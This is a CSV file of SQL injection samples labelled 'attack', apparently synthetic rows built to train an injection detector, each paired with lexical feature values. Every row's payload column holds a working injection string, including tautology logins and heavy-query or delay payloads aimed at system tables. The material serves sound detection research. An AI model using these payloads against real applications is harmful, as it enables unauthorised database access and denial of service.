id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,0.5164505192964246,72.69423711205626,20.784096004846226,3.052478212283889,13.110536726832166,10.673559278014064,36.79443492186732,12.11570618534271,0.19982768471631504,0.13684050356428287,0.49666514505273535,0.16666666666666666,0.0,3.8894632731678387,0.8894632731678387,0.0,0.0,1.8894632731678387,0.0,5.447316365839193,0.0,0.0,0.0,2.7789265463356774,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.8894632731678387,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8894632731678387
SMOTE_000012,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000126,0.08550695165062924,128.99949556146066,31.91670870321161,4.343297146130617,80.0,4.000000000000002,29.832912967883885,15.166582593576777,0.6205379662434791,0.03102689831217395,0.23089439110528895,0.1175407443390579,0.0,3.0,0.0,0.0,1.0,1.0,0.0,3.166582593576777,0.0,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000055,0.4729158701307001,141.7929918845842,31.51184298917977,4.128076347913928,76.55921494589884,8.0,41.047371956719076,16.18640498196628,0.5405240010745329,0.05688589558848425,0.2887823144987035,0.11380778883827933,0.0,3.5118429891797684,0.0,0.0,1.0,1.0,0.0,5.674561992786513,0.0,0.0,2.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.8372809963932564,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8372809963932566
SMOTE_000014,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000045,0.2601069312193414,123.42982735890179,28.455592629794086,4.026271843302271,62.83525315462249,10.607456839725447,30.91118525958817,19.07593210496568,0.5097183781914012,0.08530243634298931,0.24995184981597338,0.1550273356496361,1.0,0.0,2.0,0.0,1.0,1.075932104965681,0.0,4.075932104965681,0.9240678950343191,5.0,4.0,4.0759321049656805,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.07593210496568098,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.075932104965681
SMOTE_000015,attack,boolean,"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000066,0.5397094003636687,186.32295480190194,29.504626239830937,3.545702697717353,103.33220728156383,11.621530320126798,52.243060640253596,19.126156559957735,0.5524696952754692,0.062339086020462064,0.28155297046584066,0.10363824823822804,0.12615655995773456,0.8738434400422654,2.0,0.0,1.0,1.0,0.0,7.0,0.9999999999999998,0.0,5.621530320126796,4.0,0.12615655995773456,0.8738434400422654,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,0.06710036583638927,41.838293600570296,12.044101745299013,2.7191644308553995,2.0,12.0,19.852994182336616,7.985299418233662,0.04786744454597497,0.28720466727585,0.4739323223093182,0.1909955658688568,0.9852994182336616,0.014700581766338483,3.0,0.0,0.0,1.0,0.0,2.9705988364673237,0.014700581766338539,0.0,0.0,4.0,0.9852994182336616,0.01470058176633815,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000017,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000072,0.8910919247779285,156.0651628289563,32.62322478069581,4.101658503449113,73.65580619517395,18.0,44.06516282895629,20.344193804826048,0.47216607567832886,0.1153744752061196,0.28211437649525584,0.13034507262029568,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.344193804826048,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.655806195173952,0.344193804826048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,boolean," end and   (  ""xksk""  =  ""xksk",nearest_attack_euclidean,R000019,2.139148142015996,51.97657355284416,16.03629810586012,3.0011014384388814,13.542154717649083,5.494143388211038,24.277513188176673,8.662762258807359,0.3293130819613907,0.07043773574629536,0.4335825156256472,0.16666666666666666,0.0,3.4578452823509194,0.4578452823509198,0.0,0.0,1.4578452823509198,0.0,3.2892264117545995,0.0,0.0,0.0,1.9156905647018392,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.4578452823509198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4578452823509198
SMOTE_000019,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000116,1.1173823198443311,196.77683332812035,33.44451190513426,3.722635763800375,55.55548809486574,25.666464284597218,80.44390475892592,35.11097618973148,0.2825934114442882,0.13032860921922448,0.4086026706935609,0.1784753086429264,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.11097618973148,1.9999999999999998,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.5554880948657395,0.4445119051342604,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000020,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,0.8887806141812686,226.43205994928917,35.926923779672094,3.7817731086615214,67.01666971191241,32.30897459322403,91.70769511868838,35.398720525464356,0.2956693283731257,0.1433112517380198,0.4054472715943255,0.155572148294529,0.3089745932240322,0.0,2.0,0.0,0.0,2.0,0.0,19.235898372896127,0.0,1.3089745932240322,3.3089745932240318,11.235898372896129,0.308974593224032,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.617949186448064,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.6179491864480635
SMOTE_000021,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,0.3655297521534378,77.213954006773,28.3213954006773,3.8778335549223524,19.98209310101595,19.6427908013546,27.6069770033865,9.98209310101595,0.2606031968644172,0.25530159843220857,0.3551624802965965,0.1289327244067777,2.0,0.0,0.0,0.0,0.0,2.0,0.0,3.3213954006773,0.0,0.0,0.6606977003386498,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000022,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000106,1.2136453648959884,40.782490686767645,12.0,2.6322476612971,2.0,12.0,20.0,6.782490686767639,0.04906846346813376,0.29441078080880256,0.4906846346813376,0.165836121041726,1.0,0.0,1.7824906867676376,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.782490686767638,1.0,0.0,0.3912453433838189,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000023,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,1.1667030927214177,144.0,31.395635179112553,4.136361075023628,84.81309446266233,8.0,35.791270358225105,15.395635179112555,0.5889798226573772,0.05555555555555555,0.24855048859878548,0.10691413318828163,4.0,0.0,0.0,0.0,1.0,1.3956351791125545,0.0,4.0,0.0,0.0,2.0,2.3956351791125545,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.3956351791125545,0.6043648208874454,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000024,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,0.6716192865044707,134.59540913893525,30.56763273111482,4.120577231463949,76.54106184891856,4.86473453777036,37.27053092445928,15.919081827787053,0.5682059582443341,0.0374336148280813,0.27662443310595186,0.11773599382163279,0.0,2.567632731114821,0.0,0.0,1.0,1.0,0.0,4.783816365557411,0.0,0.0,2.783816365557411,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.7838163655574105,0.21618363444258948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000132,0.23189377452012805,147.36474284161616,30.93133177874253,4.085760811154559,88.26605130149659,8.27467288502989,35.68668221257472,15.137336442514945,0.5985515077373532,0.05601018108489403,0.24237608805246816,0.10306222312528462,4.0,0.0,0.0,0.0,1.0,1.0686682212574725,0.0,4.0,0.0,0.0,2.27467288502989,2.0686682212574725,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000026,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000009,5.3346251169565955,23.955335241446917,12.522332379276547,3.093939634621366,7.0,2.0,7.910670482893821,7.04466475855309,0.29271765793021154,0.08363361655148902,0.32732766897021986,0.2963210565480796,4.522332379276545,0.0,0.0,0.5223323792765449,0.5223323792765449,1.0,0.0,0.47766762072345514,0.0,0.0,0.0,2.0446647585530893,1.0,0.0,0.0,0.0,0.5223323792765449,1.0,0.47766762072345514,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000027,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,2.044616622501742,151.89507869359022,34.0,4.062670880874486,62.23769673397554,19.190575816506115,50.91434548990367,19.552460653204893,0.4084207876379641,0.12681567751438536,0.3356428583734004,0.12912067647425018,2.9143454899036696,0.0,0.7237696733975536,0.0,1.0,2.0,0.0,7.276230326602446,0.0,0.6381151633012232,1.3618848366987768,6.276230326602446,1.0,0.0,0.36188483669877675,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6381151633012232,1.6381151633012234,0.0,1.0,1.6381151633012232,0.6381151633012232,0.3618848366987768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.276230326602446
